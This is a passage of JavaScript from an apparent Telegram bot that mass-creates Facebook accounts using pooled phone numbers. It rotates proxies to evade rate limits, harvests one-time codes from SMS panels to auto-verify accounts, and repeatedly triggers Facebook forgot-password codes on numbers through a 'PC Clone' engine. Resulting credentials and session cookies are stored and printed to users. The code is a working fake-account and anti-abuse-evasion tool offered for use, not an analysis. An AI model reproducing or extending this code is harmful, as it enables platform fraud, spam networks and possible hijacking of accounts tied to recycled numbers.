          if (fHit) {
            liveHit = fHit;
            isBrandNewHit = true;
            break;
          }
        }
      } else if (r1.rateLimited) {
        sendRes = { ok: false, rateLimited: true, reason: r1.reason || 'Facebook OTP rate-limit' };
      }
    }

    // Primary / Automatic Escalation: PC Clone Multi-Round Proxy-Rotated OTP Engine (clean cookies + rotated IP each round)
    const desiredResends = Math.max(2, Math.min(5, Number(opts.resends ?? cfg.pc_otp_resends ?? 3)));
    const badPxSet = new Set();
    if (!liveHit && (!sendRes.ok || sendRes.rateLimited || opts.forcePc || useConfirmFormFirst)) {
      const maxOuterAttempts = proxyPool.length > 1 ? 3 : 2;
      for (let attempt = 1; attempt <= maxOuterAttempts && !liveHit; attempt++) {
        const pxAttempt = attempt === 1 && !sendRes.rateLimited
          ? px1
          : selectRotatedProxy(Number(pendingItem?.resendCount || 0) + attempt + 4);
        const pcTrig = await triggerForgotPasswordOtp(cleanPhone, cfg, pxAttempt.url, {
          freshCookies: true,
          gqlJar: null,
          assumeExists: true,
          proxiesPool: proxyPool,
          badProxies: badPxSet,
          rotateProxyPerRound: true,
          resends: desiredResends,
          recoveryUrls: normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true }),
          cc: det?.cc || cfg.cc,
          iso,
          rawProxy: pxAttempt.raw,
          nameHint: displayName,
          newPass: pendingItem?.pass || accountItem?.password || cfg.password,
          onAfterOtpSent: async ({ round, totalRounds, otpsSent }) => {
            if (statusMsgId) {
              await renderUpdate(
                [
                  `🔁 <b>PC CLONE OTP SEND (${round}/${totalRounds}x) • Proxy Rotated</b>`,
                  DIVIDER,
                  `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code> [${isoToFlag(iso)} <b>${escapeHtml(iso)}</b>]`,
                  `📡 <i>রাউন্ড ${round} পাঠানো হয়েছে — <b>Lamix Panel</b> লাইভ চেক চলছে...</i>`,
                ].join('\n'),
                { inline_keyboard: [[btnNav('📡 এখনই Lamix চেক করুন', `otp:check_lamix:${cleanPhone}`)]] }
              ).catch(() => {});
            }
            const waitPollMs = round >= totalRounds ? 2000 : 1400;
            await new Promise((r) => setTimeout(r, waitPollMs));
            lastLookup = await lookupPhoneOtpAcrossServers(cleanPhone, { forceFresh: true }).catch(() => null);
            const fHit = findFreshHit(lastLookup);
            if (fHit) {
              liveHit = fHit;
              isBrandNewHit = true;
              return { stop: true, earlyHit: fHit, otpsSent };
            }
            return { stop: false };
          },
        }).catch((e) => {
          if (e && e.isProxyError && pxAttempt.raw) badPxSet.add(proxyHealthKey(pxAttempt.raw));
          return { ok: false, reason: e instanceof Error ? e.message : 'PC recovery error' };
        });

        if (pcTrig.ok && pcTrig.item) {
          const prevResends = Number(pendingItem?.resendCount || 0);
          pcTrig.item.resendCount = prevResends + Math.max(1, Number(pcTrig.otpsSent || 1));
          pcTrig.item.autoVerify = true;
          pcTrig.item.iso = iso;
          pcTrig.item.country = countryName;
          pcTrig.item.name = displayName;
          pcTrig.item.pass = pendingItem?.pass || accountItem?.password || cfg.password || '';
          pendingItem = pcTrig.item;
          upsertUserPending(uid, pendingItem);
          sendRes = {
            ok: true,
            via: `PC-Clone (${pcTrig.via || 'recover'})`,
            resendCount: pcTrig.item.resendCount,
            proxyUsed: Boolean(pxAttempt.url),
            proxyTag: pxAttempt.url ? `${pxAttempt.isoApplied || iso}` : 'Direct',
            item: pendingItem,
          };
          break;
        }
        sendRes.reason = pcTrig.reason || pcTrig.err || sendRes.reason;
      }
    }

    appendUserLog(
      uid,
      `OTP SEND +${cleanPhone} [${iso}]: ${sendRes.ok ? `OK (${sendRes.via})` : `WARN (${sendRes.reason})`}`
    );

    if (!liveHit && statusMsgId) {
      await renderUpdate(
        [
          sendRes.ok
            ? `✅ <b>OTP SENT (${escapeHtml(sendRes.via)})</b> — 📡 <b>Lamix Panel লাইভ চেক চলছে...</b>`
            : `⚠️ <b>OTP Trigger Note:</b> <code>${escapeHtml(String(sendRes.reason || '').slice(0, 80))}</code> — 📡 <b>Lamix চেক চলছে...</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code> [${isoToFlag(iso)} <b>${escapeHtml(iso)}</b>]`,
          `🌐 <b>Proxy:</b> <code>${escapeHtml(sendRes.proxyTag || (px1.url ? px1.isoApplied || iso : 'Direct'))}</code>  •  🔁 <b>Sent:</b> <code>${sendRes.resendCount || 1}x</code>`,
          `⏳ <i>Lamix Panel-এ রিসেন্ট OTP রিসিভ হয়েছে কিনা সাথে সাথে যাচাই করা হচ্ছে...</i>`,
        ].join('\n'),
        {
          inline_keyboard: [[btnNav('📡 এখনই Lamix চেক করুন', `otp:check_lamix:${cleanPhone}`)]],
        }
      );
    }

    // Post-send 12s Lamix Panel + Server poll loop every 1.3s (skipped if already caught live during resends!)
    const watchDeadline = Date.now() + 12000;
    while (!liveHit && Date.now() < watchDeadline) {
      lastLookup = await lookupPhoneOtpAcrossServers(cleanPhone, { forceFresh: true }).catch(() => null);
      if (lastLookup?.matches?.length > 0) {
        const freshMatch = findFreshHit(lastLookup);
        if (freshMatch) {
          liveHit = freshMatch;
          isBrandNewHit = true;
          break;
        }
        if (Date.now() > watchDeadline - 6500) {
          const existingCodeHit = lastLookup.lamixMatch || lastLookup.matches.find((m) => m.code);
          if (existingCodeHit) {
            liveHit = existingCodeHit;
            break;
          }
        }
      }
      await new Promise((r) => setTimeout(r, 1300));
    }

    const kbRows = [];
    if (pendingItem) {
      kbRows.push([
        btnOk(`🔑 OTP দিন (+${cleanPhone.slice(-5)})`, `otp:enter:${cleanPhone}`),
        btnOk(`📤 আবার OTP Send (PC Proxy)`, `otp:pc_send:${cleanPhone}`),
      ]);
    } else {
      kbRows.push([btnOk(`📤 আবার OTP Send (PC Proxy)`, `otp:pc_send:${cleanPhone}`)]);
    }
    kbRows.push([
      btnNav(`📡 আবার Lamix চেক`, `otp:check_lamix:${cleanPhone}`),
      btnOk('📦 Accounts Vault', 'menu:accounts'),
    ]);
    if (pendingItem) {
      kbRows.push([btnNav('🔐 OTP Queue', 'menu:otp'), btnNav('⬅️ Main Menu', 'menu:home')]);
    }

    if (liveHit) {
      const panelBadge = liveHit.isLamix ? '🟢 Lamix Panel-এ OTP রিসিভ হয়েছে!' : `🟢 ${escapeHtml(liveHit.source)}-এ OTP রিসিভ হয়েছে!`;
      const resendBadge = isBrandNewHit ? '🆕 নতুন OTP রিসেন্ট নিশ্চিত হয়েছে' : '📩 প্যানেল ইনবক্সে OTP পাওয়া গেছে';
      await renderUpdate(
        [
          `${sendRes.ok ? '✅' : '📩'} <b>${panelBadge}</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code> [${isoToFlag(iso)} <b>${escapeHtml(iso)}</b>]`,
          `🔑 <b>OTP Code:</b> <code>${escapeHtml(liveHit.code || 'SMS')}</code>  •  📡 <b>Status:</b> ${resendBadge}`,
          `📤 <b>Send Method:</b> <code>${escapeHtml(sendRes.via || 'PC-Clone')}</code>  •  🏷 <b>Sender:</b> <code>${escapeHtml(liveHit.sender)}</code>`,
          `<blockquote>💬 <code>${escapeHtml(String(liveHit.message || '').slice(0, 180))}</code></blockquote>`,
        ].join('\n'),
        { inline_keyboard: kbRows }
      );
    } else {
      const lamixInfo = lastLookup?.lamixConfigured
        ? `📥 <b>Lamix Panel স্ক্যান:</b> <code>${lastLookup.lamixScannedCount || 0}টি</code> মেসেজ চেক করা হয়েছে — এখনো নতুন OTP রিসেন্ট দেখা যায়নি।`
        : `⚠️ <i>Lamix Panel টোকেন সেট করা নেই।</i>`;
      await renderUpdate(
        [
          sendRes.ok ? `✅ <b>OTP SEND SUCCESS (${escapeHtml(sendRes.via)})</b>` : `⚠️ <b>OTP SEND NOTICE</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code> [${isoToFlag(iso)} <b>${escapeHtml(iso)}</b>]`,
          sendRes.ok
            ? `🌐 <b>Proxy:</b> <code>${escapeHtml(sendRes.proxyTag || 'Rotated')}</code>  •  🔁 <b>Total Sent:</b> <code>${sendRes.resendCount}x</code>`
            : `<blockquote>${escapeHtml(sendRes.reason || 'Could not confirm resend on Facebook')}</blockquote>`,
          lamixInfo,
          `<i>আসলে ব্যাকগ্রাউন্ড ওয়াচার সাথে সাথে ভেরিফাই করবে অথবা নিচে <b>Lamix চেক</b> চাপুন।</i>`,
        ].join('\n'),
        { inline_keyboard: kbRows }
      );
    }
  }

  async function startFbAutoCreateRun(chatId, user, countryId, targetCount) {
    const st = readSettings();
    const cfg = readUserConfig(user.id);
    const country = findCountryById(countryId);

    if (!country) {
      await sendMessage(chatId, '⚠️ Please select a valid Country first.', {
        inline_keyboard: [[btnOk('⚡ FB Auto create', 'menu:fb_auto_create')]],
      });
      return;
    }
    const countryStats = getCountryInventoryStats().find((c) => c.id === country.id);
    if (!countryStats || countryStats.available <= 0) {
      await sendMessage(chatId, `⚠️ <b>${escapeHtml(country.name)}</b> currently has 0 available numbers.`, {
        inline_keyboard: [[btnNav('⬅️ FB Auto create', 'menu:fb_auto_create')]],
      });
      return;
    }
    if (!cfg.password || cfg.password.length < 6) {
      await sendMessage(chatId, '⚠️ Set a default Facebook password (min 6 chars) before starting.', {
        inline_keyboard: [[btnOk('🔒 Set Password', 'set:pw'), btnNav('⬅️ FB Auto create', 'menu:fb_auto_create')]],
      });
      return;
    }
    const existing = activeRuns.get(user.id);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A run is already in progress. Stop it first or wait for completion.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }
    const isAdmin = isUserAdmin(user, st);
    const remainingQuota = Math.max(0, user.dailyLimit - user.usedToday);
    if (!isAdmin && remainingQuota <= 0) {
      await sendMessage(chatId, `🚫 Daily quota reached (${user.usedToday}/${user.dailyLimit}).`, {
        inline_keyboard: [[btnNav('⬅️ FB Auto create', 'menu:fb_auto_create')]],
      });
      return;
    }

    const totalTarget = isAdmin ? targetCount : Math.min(targetCount, remainingQuota);
    const watchPhones = new Set();
    const runState = {
      running: true,
      abortRequested: false,
      total: totalTarget,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
      watchPhones,
    };
    activeRuns.set(user.id, runState);

    const validMinutes = Math.max(1, Number(st.numberValidMinutes) || 10);
    const statusRes = await sendMessage(
      chatId,
      [
        `⚡ <b>FB AUTO CREATE • STARTING</b>`,
        DIVIDER,
        `🌍 <b>Country:</b> <code>${escapeHtml(country.name)}</code>  •  <b>Target:</b> <code>${totalTarget}</code> account(s)`,
        `⏳ Claiming fresh numbers, creating FB accounts &amp; listening for live OTPs...`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progressMsgId = statusRes.ok && statusRes.result?.message_id ? statusRes.result.message_id : null;

    pushBotLog(`User ${user.id} started FB Auto Create (Country=${country.name}, target=${totalTarget})`);
    appendUserLog(user.id, `FB AUTO CREATE STARTED: Country=${country.name} (#${country.id}), count=${totalTarget}`);

    (async () => {
      const userProxies = readUserProxies(user.id);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const userBaseCookie = readUserCookies(user.id);
      const badProxies = new Set();
      const seenNumbers = new Set();
      const threads = Math.max(1, Math.min(4, Number(cfg.threads ?? 3), totalTarget));
      const watchMap = new Map(); // phone -> { phone, poolNumberId, name, startedAt, item, done: false, countryIso, countryName }
      const seenOtpKeys = new Set();
      const resendTasks = [];
      let allocatedTries = 0;
      const maxAllocTries = Math.max(totalTarget * 4, totalTarget + 6);
      let outOfStockHits = 0;
      let grabDoneCount = 0;
      let autoVerifiedCount = 0;
      let totalResentCount = 0;
      let lastEditAt = 0;
      let workersDone = false;

      // Pre-seed historical SMS keys from active Admin API Panels so old SMS on recycled numbers do not falsely match
      const preRes = await fetchAllActivePanelsSms(true);
      if (preRes.ok) {
        for (const row of preRes.rows) {
          seenOtpKeys.add(smsRowKey(row));
        }
      }

      const updateCreateProgress = async (statusLine = '', force = false) => {
        if (!progressMsgId) return;
        const now = Date.now();
        if (!force && now - lastEditAt < 2500) return;
        lastEditAt = now;
        const waitingOtpCnt = Array.from(watchMap.values()).filter((w) => !w.done).length;
        await editMessage(
          chatId,
          progressMsgId,
          [
            `⚡ <b>FB AUTO CREATE (${threads}x • ${escapeHtml(country.name)})</b>`,
            DIVIDER,
            statusLine || `📱 <b>Active:</b> <code>${runState.currentNumber ? '+' + escapeHtml(runState.currentNumber) : 'Processing...'}</code>`,
            `📊 <b>Progress:</b> <code>${renderProgressBar(runState.completed, totalTarget)}</code> (<code>${runState.completed}/${totalTarget}</code>)`,
            `✅ Ready: <code>${runState.okCount}</code> (⚡Auto-OTP: <code>${autoVerifiedCount}</code>)  •  ⏳ Waiting: <code>${waitingOtpCnt}</code>  •  🔁 Resends: <code>${totalResentCount}</code>  •  ❌ Fail: <code>${runState.failCount}</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] },
          { throttle: true, noRetry: true, minIntervalMs: force ? 1200 : 2500 }
        );
      };

      const markWatcherVerified = async (match, uidFound, cookiesFound, codeUsed = 'AUTO') => {
        if (!match || match.done) return;
        match.done = true;
        watchPhones.delete(match.phone);
        if (match.poolNumberId) consumeClaimedNumber(match.poolNumberId);
        autoVerifiedCount += 1;
        runState.okCount += 1;
        runState.pendingCount = Math.max(0, runState.pendingCount - 1);
        storeUserAccount(user.id, {
          name: match.item.name,
          phone: match.phone,
          pass: cfg.password,
          uid: uidFound,
          status: 'OK',
          confirmed: true,
          cookies: cookiesFound,
        });
        const curPend = readUserPending(user.id).filter((p) => p.phone !== match.phone);
        writeUserPending(user.id, curPend);
        const usersMap = readUsersMap();
        if (usersMap[user.id]) {
          usersMap[user.id].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(cookiesFound || {});
        const cTag = match.countryIso ? ` [${escapeHtml(match.countryName || '')} • <b>${escapeHtml(match.countryIso)}</b>]` : '';
        await sendMessage(
          chatId,
          [
            `✅ <b>FB AUTO-OTP VERIFIED!</b>`,
            DIVIDER,
            `👤 <b>Profile:</b> ${escapeHtml(match.item.name)}${cTag}`,
            `📱 <b>Number:</b> <code>+${escapeHtml(match.phone)}</code>  •  🔑 <b>OTP:</b> <code>${escapeHtml(codeUsed)}</code>`,
            `🆔 <b>UID|Pass:</b> <code>${escapeHtml(uidFound)}|${escapeHtml(cfg.password)}</code>`,
            ``,
            `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${match.phone}`), btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${match.phone}`)],
              [btnOk('📦 View Accounts', 'menu:accounts'), btnNav('⚡ FB Auto create', 'menu:fb_auto_create')],
            ],
          }
        );
      };

      // Background API Panel OTP Watcher Loop (concurrent with creation + up to postRunWaitMs after)
      const postRunWaitMs = Math.min(180000, Math.max(60000, validMinutes * 60000));
      const otpWatcherLoop = (async () => {
        let postRunDeadline = 0;
        while (!runState.abortRequested) {
          const pendingWatchers = Array.from(watchMap.values()).filter((w) => !w.done && !w.verifying);
          if (workersDone) {
            if (Array.from(watchMap.values()).every((w) => w.done)) break;
            if (!postRunDeadline) postRunDeadline = Date.now() + postRunWaitMs;
            if (Date.now() > postRunDeadline) break;
          }
          if (pendingWatchers.length > 0) {
            const activePanels = readPanelsStore().panels.filter((p) => p.active !== false);
            const minIntervalMs = activePanels.length > 0
              ? Math.max(2500, Math.min(...activePanels.map((p) => Math.max(3, Number(p.scan_interval) || 5) * 1000)))
              : 3000;
            const smsRes = await fetchAllActivePanelsSms(true);
            if (smsRes.ok && smsRes.rows.length > 0) {
              for (const row of smsRes.rows) {
                const key = smsRowKey(row);
                if (seenOtpKeys.has(key)) continue;
                const match = pendingWatchers.find(
                  (w) => !w.done && !w.verifying && phoneDigitsMatch(row.number, w.phone)
                );
                if (!match) continue;
                seenOtpKeys.add(key);
                seenBackgroundSmsKeys.add(key);
                const code = extractFbOtpFromSms(row.message);
                if (!code) {
                  appendUserLog(user.id, `AUTO CREATE SMS +${match.phone}: no OTP digits in "${String(row.message).slice(0, 60)}"`);
                  continue;
                }
                match.verifying = true;
                activeOtpVerifyPhones.add(match.phone);
                appendUserLog(user.id, `AUTO CREATE OTP MATCHED +${match.phone} [${match.countryIso || 'PX'}] -> ${code}`);
                await updateCreateProgress(
                  `📩 <b>OTP Received!</b> <code>+${escapeHtml(match.phone)}</code> [<b>${escapeHtml(match.countryIso || '')}</b>] → <code>${escapeHtml(code)}</code> (Verifying...)`,
                  true
                );
                try {
                  const confirmRes = await performOtpConfirm({ ...match.item }, code, cfg, userBaseCookie);
                  if (confirmRes.status === 'OK') {
                    await markWatcherVerified(match, confirmRes.uid, confirmRes.cookies, code);
                  } else if (confirmRes.status === 'RETRY') {
                    match.verifying = false;
                    match.item = confirmRes.item;
                    upsertUserPending(user.id, confirmRes.item);
                  } else {
                    match.verifying = false;
                    match.done = true;
                    watchPhones.delete(match.phone);
                    if (match.poolNumberId) consumeClaimedNumber(match.poolNumberId);
                    appendUserLog(user.id, `AUTO CREATE OTP VERIFY FAILED +${match.phone}: ${confirmRes.err || confirmRes.status}`);
                  }
                } finally {
                  activeOtpVerifyPhones.delete(match.phone);
                }
              }
            }
            await new Promise((r) => setTimeout(r, minIntervalMs));
          } else {
            await new Promise((r) => setTimeout(r, 2500));
          }
        }
      })();

      const worker = async (workerIdx) => {
        while (!runState.abortRequested) {
          if (grabDoneCount >= totalTarget) break;
          if (allocatedTries >= maxAllocTries || outOfStockHits >= 1) break;
          allocatedTries += 1;

          const claimedList = claimAvailableNumbers(user.id, country.id, 1);
          if (!claimedList || claimedList.length === 0) {
            outOfStockHits += 1;
            appendUserLog(user.id, `FB AUTO CREATE: ${country.name} pool out of stock`);
            await updateCreateProgress(`⚠️ Country <b>${escapeHtml(country.name)}</b> ran out of available numbers.`, true);
            break;
          }
          const claimed = claimedList[0];
          const phone = claimed.number;
          if (!phone || seenNumbers.has(phone)) {
            consumeClaimedNumber(claimed.id);
            continue;
          }
          seenNumbers.add(phone);

          const det = detectCountryFromNumber(`+${phone}`, cfg.cc, country.name);
          const numIso = (cfg.auto_proxy_country !== false && det?.iso && det.iso !== '??')
            ? det.iso
            : (countryNameToIso(country.name) || getCountryInfo(cfg.cc)[1]);
          const numCName = (det?.name && det.name !== 'Unknown') ? det.name : (country.name || getCountryInfo(cfg.cc)[0]);

          const px = proxyPool.length > 0 ? selectSmartProxy(proxyPool, allocatedTries, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null, numIso) : cfg.proxy || null;
          if (cfg.precheck_gql !== false) {
            try {
              const useDirectGql = cfg.gql_via_direct !== false;
              const gAdapted = adaptProxyForSession(useDirectGql ? null : px, {
                iso: numIso,
                autoCountry: cfg.auto_proxy_country !== false,
                refreshSession: cfg.auto_proxy_refresh !== false,
              });
              const gPx = useDirectGql ? null : gAdapted.url;
              let gql;
              try {
                gql = await checkNumberGraphql(`+${phone}`, {
                  cc: det?.cc || cfg.cc,
                  proxy: gPx,
                  strictProxy: cfg.strict_proxy !== false,
                  timeoutMs: 9000,
                  shouldAbort: () => runState.abortRequested,
                });
              } catch (err) {
                if (err && err.isProxyError && !useDirectGql && /407/.test(err.message || '') && px && (gAdapted.countryInjected || gAdapted.sessionInjected)) {
                  dynamicProxyTagBlacklist.add(proxyHealthKey(px));
                  gql = await checkNumberGraphql(`+${phone}`, {
                    cc: det?.cc || cfg.cc,
                    proxy: px,
                    strictProxy: cfg.strict_proxy !== false,
                    timeoutMs: 9000,
                    shouldAbort: () => runState.abortRequested,
                  });
                } else {
                  throw err;
                }
              }
              if (gql.status === 'taken') {
                consumeClaimedNumber(claimed.id);
                appendUserLog(user.id, `AUTO CREATE +${phone} [${numCName} • ${numIso}] GQL TAKEN -> consumed & skipping`);
                await updateCreateProgress(`⏭ <code>+${escapeHtml(phone)}</code> [${escapeHtml(numIso)}] already on FB, grabbing next...`);
                continue;
              }
            } catch (err) {
              if (err && err.isProxyError && px) badProxies.add(proxyHealthKey(px));
            }
          }

          if (grabDoneCount >= totalTarget || runState.abortRequested) break;
          const slotIdx = ++grabDoneCount;
          runState.currentNumber = phone;
          const attemptStartedAt = Date.now();
          const pxInfo = adaptProxyForSession(px, {
            iso: numIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: false,
          });
          const pxTag = px ? `🌐 PX: <b>${escapeHtml(pxInfo.isoApplied || numIso)}</b>` : '🌐 Direct';
          await updateCreateProgress(
            `🚀 <b>Creating #${slotIdx}/${totalTarget}:</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numCName)} • ${escapeHtml(numIso)}</b>] • ${pxTag}`,
            slotIdx === 1
          );

          const res = await runNodeAttempt(phone, cfg.password, cfg, px, {
            baseCookiesRaw: userBaseCookie,
            shouldAbort: () => runState.abortRequested,
            proxiesPool: proxyPool,
            badProxies,
            skipPrecheck: true,
            countryHint: numCName,
            onDebug: (m) => appendUserLog(user.id, m),
          });

          if (res.debugHtml) saveUserDebugHtml(user.id, res.debugHtml);
          markUserDone(user.id, phone);
          runState.completed += 1;

          const usersMap = readUsersMap();
          const uRec = usersMap[user.id];
          if (uRec) {
            uRec.usedToday += 1;
            if (res.status === 'OK') uRec.totalOk += 1;
            else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') uRec.totalPending += 1;
            else uRec.totalFail += 1;
            uRec.lastActiveAt = Date.now();
            writeUsersMap(usersMap);
          }

          if (res.status === 'OK') {
            consumeClaimedNumber(claimed.id);
            runState.okCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              uid: res.uid,
              status: 'OK',
              confirmed: true,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
            });
            const cstr = formatCookieHeader(res.cookies || {});
            await sendMessage(
              chatId,
              [
                `✅ <b>FB ACCOUNT READY</b>`,
                DIVIDER,
                `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(numCName)} • <b>${escapeHtml(numIso)}</b>]`,
                `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                `🔑 <b>UID|Pass:</b> <code>${escapeHtml(res.uid)}|${escapeHtml(cfg.password)}</code>`,
                `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
              ].join('\n'),
              {
                inline_keyboard: [
                  [btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${phone}`), btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${phone}`)],
                  [btnOk('📦 View Accounts', 'menu:accounts'), btnNav('⚡ FB Auto create', 'menu:fb_auto_create')],
                ],
              }
            );
          } else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') {
            runState.pendingCount += 1;
            if (res.pendingPayload) {
              res.pendingPayload.iso = numIso;
              res.pendingPayload.country = numCName;
              res.pendingPayload.poolNumberId = claimed.id;
              res.pendingPayload.poolClaimedAt = claimed.assignedAt;
              res.pendingPayload.autoVerify = true;
              upsertUserPending(user.id, res.pendingPayload);
              const watcher = {
                phone,
                poolNumberId: claimed.id,
                name: res.name,
                startedAt: attemptStartedAt,
                item: res.pendingPayload,
                done: false,
                countryIso: numIso,
                countryName: numCName,
              };
              watchMap.set(phone, watcher);
              watchPhones.add(phone);

              const resendRounds = Math.max(0, Math.min(3, Number(cfg.auto_otp_resend ?? 2)));
              if (resendRounds > 0) {
                const rTask = (async () => {
                  await performAutoOtpResends(watcher.item, cfg, userBaseCookie, {
                    rounds: resendRounds,
                    shouldAbort: () => runState.abortRequested || watcher.done || watcher.verifying,
                    onStep: async (round, totalRounds, stepRes, curItem) => {
                      if (watcher.done || watcher.verifying) return;
                      curItem.poolNumberId = claimed.id;
                      curItem.poolClaimedAt = claimed.assignedAt;
                      curItem.autoVerify = true;
                      watcher.item = curItem;
                      if (stepRes.alreadyConfirmed) {
                        await markWatcherVerified(watcher, stepRes.uid, stepRes.cookies, 'AUTO');
                        return;
                      }
                      if (stepRes.ok) {
                        totalResentCount += 1;
                        upsertUserPending(user.id, curItem);
                        appendUserLog(user.id, `AUTO CREATE +${phone} [${numIso}] OTP Resent (${round}/${totalRounds}) via ${stepRes.via}`);
                        await updateCreateProgress(
                          `🔁 <b>OTP Resent (${round}/${totalRounds}):</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numIso)}</b>]`,
                          false
                        );
                      } else {
                        appendUserLog(user.id, `AUTO CREATE +${phone} [${numIso}] Resend ${round}/${totalRounds}: ${stepRes.reason || 'stopped'}`);
                      }
                    },
                  });
                })();
                resendTasks.push(rTask);
              }
            }
            await updateCreateProgress(
              `📩 <b>OTP Sent!</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(numCName)} • ${escapeHtml(numIso)}</b>] queued &amp; watching API panels...`,
              true
            );
          } else {
            consumeClaimedNumber(claimed.id);
            runState.failCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              status: res.status,
              confirmed: false,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
              err: res.err,
            });
          }

          if (workerIdx === 0) await updateCreateProgress();
        }
      };

      await Promise.all(Array.from({ length: threads }, (_, wi) => worker(wi)));
      if (resendTasks.length > 0) await Promise.allSettled(resendTasks);
      workersDone = true;

      const stillWaiting = Array.from(watchMap.values()).filter((w) => !w.done).length;
      if (stillWaiting > 0 && !runState.abortRequested) {
        await updateCreateProgress(`📡 Waiting up to <code>${Math.round(postRunWaitMs / 1000)}s</code> for <code>${stillWaiting}</code> pending OTP(s)...`, true);
      }
      await otpWatcherLoop;

      runState.running = false;
      runState.currentNumber = null;
      watchPhones.clear();
      const unconfirmedLeft = Array.from(watchMap.values()).filter((w) => !w.done).length;
      pushBotLog(`User ${user.id} finished FB Auto Create: OK=${runState.okCount}, AutoOTP=${autoVerifiedCount}, Waiting=${unconfirmedLeft}, FAIL=${runState.failCount}`);

      const summaryTxt = [
        runState.abortRequested ? `🛑 <b>FB AUTO CREATE STOPPED</b>` : `🏁 <b>FB AUTO CREATE COMPLETED</b>`,
        DIVIDER,
        `🌍 <b>Country:</b> <code>${escapeHtml(country.name)}</code>  •  <b>Processed:</b> <code>${runState.completed}/${totalTarget}</code>`,
        `✅ <b>Ready Accounts:</b> <code>${runState.okCount}</code> (⚡Auto-OTP: <code>${autoVerifiedCount}</code>)`,
        `🔐 <b>Still Pending OTP:</b> <code>${unconfirmedLeft}</code>`,
        `❌ <b>Failed/Other:</b> <code>${runState.failCount}</code>`,
        outOfStockHits > 0 ? `\n⚠️ <i>Stopped early because ${escapeHtml(country.name)} ran out of numbers.</i>` : '',
      ].filter(Boolean).join('\n');

      if (progressMsgId) {
        await editMessage(chatId, progressMsgId, summaryTxt, {
          inline_keyboard: [
            [
              btnOk('⚡ FB Auto create', 'menu:fb_auto_create'),
              btnOk('📦 Accounts', 'menu:accounts'),
              btnNav('🔐 OTP Queue', 'menu:otp'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        });
      }
    })();
  }

  // ── HBX FB TOOLS (MATCHES HBXFB.so 100%: 2OO9 + POOL + LAMIX + CUSTOM) ─────
  const fbTools2oo9RangeCache = new Map();
  const fbToolsLamixRangeCache = new Map();
  const fbToolsLastBatchConfig = new Map();
  const fbToolsWatchAbort = new Map();

  function resolveFbToolsPassword(cfg) {
    return String(cfg?.fb_tools_password || cfg?.password || '').trim();
  }

  function resolveFbToolsLamixToken() {
    const st = readSettings();
    if (st.globalLamixToken) return String(st.globalLamixToken).trim();
    if (st.globalLamixCleared) return '';
    return String(process.env.LAMIX_TOKEN || '').trim();
  }

  function resolveFbTools2oo9Keys() {
    return resolveHbx2oo9Keys(readSettings());
  }

  function resolveFbToolsVoltexUrl() {
    return String(readSettings().globalVoltexBaseUrl || '').trim();
  }

  function getFbToolsSourceMeta(cfg) {
    const src = ['2oo9', 'pool', 'lamix', 'custom'].includes(cfg?.fb_tools_source)
      ? cfg.fb_tools_source
      : '2oo9';
    const meta = {
      '2oo9': { label: '🌐 LOL সার্ভার ১ (লাইভ রেঞ্জ + OTP)', short: 'LOL সার্ভার ১' },
      pool: { label: '🌍 অ্যাডমিন কান্ট্রি পুল (Admin Pool)', short: 'Admin Pool' },
      lamix: { label: '📡 LOL সার্ভার ২ (প্রিমিয়াম রেঞ্জ)', short: 'LOL সার্ভার ২' },
      custom: { label: '📝 কাস্টম নাম্বার (নিজের নাম্বার পেস্ট)', short: 'Custom' },
    };
    return { src, ...meta[src] };
  }

  async function renderFbToolsMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const { src, label: srcLabel } = getFbToolsSourceMeta(cfg);
    const savedPw = resolveFbToolsPassword(cfg);
    const pwBadge = savedPw && savedPw.length >= 6
      ? `🟢 সেট আছে (<code>${escapeHtml(savedPw.length > 4 ? `${savedPw.slice(0, 2)}${'*'.repeat(savedPw.length - 4)}${savedPw.slice(-2)}` : '****')}</code>)`
      : `🔴 <b>সেট করা নেই</b>`;
    const srv1Ready = resolveFbTools2oo9Keys().length > 0;
    const srv2Ready = Boolean(resolveFbToolsLamixToken());
    const countries = getCountryInventoryStats();
    let selCountry = countries.find((c) => c.id === Number(cfg.fb_tools_country_id));
    if (!selCountry && countries.length > 0) {
